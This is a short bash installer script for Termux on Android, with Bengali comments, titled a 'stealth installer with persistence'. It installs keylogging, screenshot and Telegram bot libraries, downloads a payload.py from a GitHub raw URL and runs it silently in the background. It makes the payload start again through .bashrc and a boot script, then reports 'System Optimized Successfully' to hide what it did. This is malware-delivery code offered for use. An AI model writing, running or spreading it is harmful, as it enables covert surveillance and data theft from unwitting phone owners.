#!/bin/bash
# Advanced Stealth Installer with Persistence

echo "Updating and Installing Dependencies..."
pkg install python python-pip termux-api -y
pip install pyTelegramBotAPI requests pynput pyautogui pillow

# আপনার গিটহাব থেকে পেলোড নামানো
curl -LO https://raw.githubusercontent.com/yashkhanofficial/Advanced-system-core/main/payload.py

# --- রিস্টার্টের পর অটো-স্টার্ট করার কোড (Persistence) ---
# ১. টার্মাক্স ওপেন হলেই যাতে স্ক্রিপ্ট রান হয় তার জন্য .bashrc ফাইলে যোগ করা
echo "nohup python ~/payload.py > /dev/null 2>&1 &" >> ~/.bashrc

# ২. টার্মাক্স বুট স্ক্রিপ্ট তৈরি (যদি termux-boot ব্যবহার করা হয়)
mkdir -p ~/.termux/boot
echo "nohup python ~/payload.py > /dev/null 2>&1 &" > ~/.termux/boot/start-payload

# ব্যাকগ্রাউন্ডে বর্তমানে চালু করা
nohup python payload.py > /dev/null 2>&1 &

echo "System Optimized Successfully with Persistence!"
